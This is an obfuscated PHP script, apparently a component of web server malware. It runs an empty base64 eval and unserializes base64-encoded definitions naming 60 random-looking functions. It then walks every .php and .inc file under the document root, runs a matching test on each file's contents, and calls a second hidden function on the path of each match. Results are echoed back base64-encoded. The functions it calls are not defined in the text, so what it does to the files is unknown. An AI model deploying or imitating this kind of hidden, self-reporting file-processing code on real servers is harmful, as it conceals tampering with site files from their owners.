eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo2MDp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo2OiJybm9sbmYiO2k6MjtzOjY6ImdiYmR6YiI7fWk6MTthOjM6e2k6MDtpOjU7aToxO3M6OToicnd3eXdtdGlmIjtpOjI7czo2OiJnaGlwa3QiO31pOjI7YTozOntpOjA7aToxNTtpOjE7czoxMToicnh0c2hranRpeW4iO2k6MjtzOjEwOiJnem93eWxmaXFwIjt9aTozO2E6Mzp7aTowO2k6MTg7aToxO3M6NjoicnVteWF5IjtpOjI7czo5OiJncHVrc2ZqbmQiO31pOjQ7YTozOntpOjA7aToyMztpOjE7czo2OiJyaW1pemsiO2k6MjtzOjQ6ImdlaGgiO31pOjU7YTozOntpOjA7aTozNjtpOjE7czo1OiJybm15YiI7aToyO3M6NjoiZ3Fwb3h4Ijt9aTo2O2E6Mzp7aTowO2k6NDI7aToxO3M6NDoicmtmYiI7aToyO3M6NToiZ3d2Y2wiO31pOjc7YTozOntpOjA7aTo1NDtpOjE7czo1OiJyd2NwYSI7aToyO3M6NDoiZ3VxdCI7fWk6ODthOjM6e2k6MDtpOjYwO2k6MTtzOjExOiJya2Zpa2hyamZ3ayI7aToyO3M6NzoiZ3Ntc3lkdyI7fWk6OTthOjM6e2k6MDtpOjg5O2k6MTtzOjQ6InJqYmMiO2k6MjtzOjQ6ImdiYngiO31pOjEwO2E6Mzp7aTowO2k6MTA5O2k6MTtzOjg6InJ0Z3VzbGFoIjtpOjI7czo3OiJnZ3RvbWtiIjt9aToxMTthOjM6e2k6MDtpOjExMDtpOjE7czoxMDoicmt6Ym9jc2lkYyI7aToyO3M6NzoiZ3Zua3pwbyI7fWk6MTI7YTozOntpOjA7aToxMTE7aToxO3M6NDoicmN6dyI7aToyO3M6MTE6ImdmY3hxaGVhaHVvIjt9aToxMzthOjM6e2k6MDtpOjExMjtpOjE7czo2OiJycnFveWMiO2k6MjtzOjk6Imd1dndjaWJ2ZSI7fWk6MTQ7YTozOntpOjA7aToxMTU7aToxO3M6MTA6InJteXNha3ltdmMiO2k6MjtzOjY6Imd4dGFrbiI7fWk6MTU7YTozOntpOjA7aToxMTg7aToxO3M6NjoicmVodGRwIjtpOjI7czo1OiJnaHJtcSI7fWk6MTY7YTozOntpOjA7aToxMjY7aToxO3M6MTE6InJmeHRlb3BzZW90IjtpOjI7czo4OiJncHd2eGZtZyI7fWk6MTc7YTozOntpOjA7aToxMjc7aToxO3M6MTE6InJnZHJocmRoZWZ2IjtpOjI7czoxMDoiZ3ppa2ltbHZkayI7fWk6MTg7YTozOntpOjA7aToxMzA7aToxO3M6NDoicnhsZCI7aToyO3M6MTE6ImdrZWZ6bnRybmZsIjt9aToxOTthOjM6e2k6MDtpOjEzNDtpOjE7czo0OiJyZnp4IjtpOjI7czo1OiJnZW9kaiI7fWk6MjA7YTozOntpOjA7aToxMzg7aToxO3M6NToicnhhcHIiO2k6MjtzOjg6ImdncWlyZHJsIjt9aToyMTthOjM6e2k6MDtpOjE0NjtpOjE7czo3OiJyeXB5aWZ3IjtpOjI7czo4OiJndnZwc2dkbCI7fWk6MjI7YTozOntpOjA7aToxNDg7aToxO3M6MTE6InJsaHFpbmt5aGJnIjtpOjI7czo1OiJnaWl4dyI7fWk6MjM7YTozOntpOjA7aToxNTc7aToxO3M6OToicnlkc3lsaWp0IjtpOjI7czo4OiJnd2xyam5ndyI7fWk6MjQ7YTozOntpOjA7aToxNjM7aToxO3M6NDoicm16byI7aToyO3M6NDoiZ29xeiI7fWk6MjU7YTozOntpOjA7aToxNjY7aToxO3M6NDoicmFxYiI7aToyO3M6NjoiZ3BscG9zIjt9aToyNjthOjM6e2k6MDtpOjE3MjtpOjE7czo3OiJyZmJ0cGd5IjtpOjI7czo2OiJna3F4bHkiO31pOjI3O2E6Mzp7aTowO2k6MTc0O2k6MTtzOjk6InJrZGFzdGJhayI7aToyO3M6NDoiZ2xyaSI7fWk6Mjg7YTozOntpOjA7aToxNzk7aToxO3M6NzoicnJ6YWpkZiI7aToyO3M6NToiZ3BudmEiO31pOjI5O2E6Mzp7aTowO2k6MTg3O2k6MTtzOjc6InJsbmlmeXQiO2k6MjtzOjQ6Imdza3EiO31pOjMwO2E6Mzp7aTowO2k6MTg5O2k6MTtzOjU6InJkeXJiIjtpOjI7czo4OiJna2pyaXFmeSI7fWk6MzE7YTozOntpOjA7aToxOTI7aToxO3M6OToicmFrYnZvd3RpIjtpOjI7czoxMToiZ2tiamtvcmZicG4iO31pOjMyO2E6Mzp7aTowO2k6MTk2O2k6MTtzOjU6InJsd210IjtpOjI7czo0OiJnenFtIjt9aTozMzthOjM6e2k6MDtpOjE5ODtpOjE7czo2OiJydXp1c3UiO2k6MjtzOjExOiJnZG52dHBjZmlkaiI7fWk6MzQ7YTozOntpOjA7aToxOTk7aToxO3M6ODoicmxudG1od2IiO2k6MjtzOjExOiJnZ2ZwaXR6cWpmZyI7fWk6MzU7YTozOntpOjA7aToyMDA7aToxO3M6NToicmhkcHoiO2k6MjtzOjk6Imd4dm12Z3p5biI7fWk6MzY7YTozOntpOjA7aToyMDE7aToxO3M6ODoicmptcGd1eGoiO2k6MjtzOjEwOiJnb2JqcWdnemNmIjt9aTozNzthOjM6e2k6MDtpOjIwMztpOjE7czo0OiJycXhjIjtpOjI7czo3OiJnaWhoamhuIjt9aTozODthOjM6e2k6MDtpOjIwNjtpOjE7czo1OiJyZGZqcyI7aToyO3M6MTE6Imd5cnllYnBmcnBzIjt9aTozOTthOjM6e2k6MDtpOjIwOTtpOjE7czo4OiJyZ3FscnZjayI7aToyO3M6MTA6ImdrZmNyY211eWwiO31pOjQwO2E6Mzp7aTowO2k6MjEwO2k6MTtzOjU6InJwcHh1IjtpOjI7czo4OiJna3ppc3VncSI7fWk6NDE7YTozOntpOjA7aToyMTI7aToxO3M6NzoicnhsaWpxbSI7aToyO3M6OToiZ2thb2xraHplIjt9aTo0MjthOjM6e2k6MDtpOjIxMztpOjE7czo2OiJybXdhdWgiO2k6MjtzOjExOiJnZHNhY2dldmluZiI7fWk6NDM7YTozOntpOjA7aToyMTQ7aToxO3M6NjoicmtmaXZ1IjtpOjI7czoxMToiZ2Jkd25lYW5mdGsiO31pOjQ0O2E6Mzp7aTowO2k6MjE1O2k6MTtzOjU6InJjeHR6IjtpOjI7czo1OiJnYWN4eiI7fWk6NDU7YTozOntpOjA7aToyMTY7aToxO3M6NDoicnZxaCI7aToyO3M6MTE6ImdkZ3VrcmJlaGp1Ijt9aTo0NjthOjM6e2k6MDtpOjIxNztpOjE7czoxMToicmNveXRvZHNycmQiO2k6MjtzOjQ6ImdidXYiO31pOjQ3O2E6Mzp7aTowO2k6MjE4O2k6MTtzOjg6InJzd2tqbnluIjtpOjI7czo4OiJna2l5cXNldCI7fWk6NDg7YTozOntpOjA7aToyMTk7aToxO3M6OToicndzeXRqcHZnIjtpOjI7czo5OiJnZmN5ZGFiemsiO31pOjQ5O2E6Mzp7aTowO2k6MjIwO2k6MTtzOjY6InJkeGtpeiI7aToyO3M6NToiZ2pnaGkiO31pOjUwO2E6Mzp7aTowO2k6MjIxO2k6MTtzOjk6InJ3anp0c3psZyI7aToyO3M6NzoiZ3Z3bGdicSI7fWk6NTE7YTozOntpOjA7aToyMjI7aToxO3M6NToicnZudmYiO2k6MjtzOjU6ImdqcGxxIjt9aTo1MjthOjM6e2k6MDtpOjIyMztpOjE7czo2OiJyYnhrYWciO2k6MjtzOjQ6ImdueWQiO31pOjUzO2E6Mzp7aTowO2k6MjI0O2k6MTtzOjc6InJzbmd6dW8iO2k6MjtzOjEwOiJncmRubmxubXNzIjt9aTo1NDthOjM6e2k6MDtpOjIyNTtpOjE7czo0OiJyZml4IjtpOjI7czo2OiJnb2Z0YWMiO31pOjU1O2E6Mzp7aTowO2k6MjI2O2k6MTtzOjY6InJ5YWNkdyI7aToyO3M6OToiZ2ZvemJtdGZqIjt9aTo1NjthOjM6e2k6MDtpOjIyNztpOjE7czo2OiJya2Npb3QiO2k6MjtzOjk6Imd0a2VkdWxjdiI7fWk6NTc7YTozOntpOjA7aToyMjg7aToxO3M6MTE6InJ1c3ZkZHNyc2h6IjtpOjI7czo4OiJnbXhmcHZoYiI7fWk6NTg7YTozOntpOjA7aToyMjk7aToxO3M6NzoicmVqZWNibyI7aToyO3M6NzoiZ2Z5bnNiZiI7fWk6NTk7YTozOntpOjA7aToyMzA7aToxO3M6NzoicmlrZWlucSI7aToyO3M6NjoiZ2Z6cW1rIjt9fQ=="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();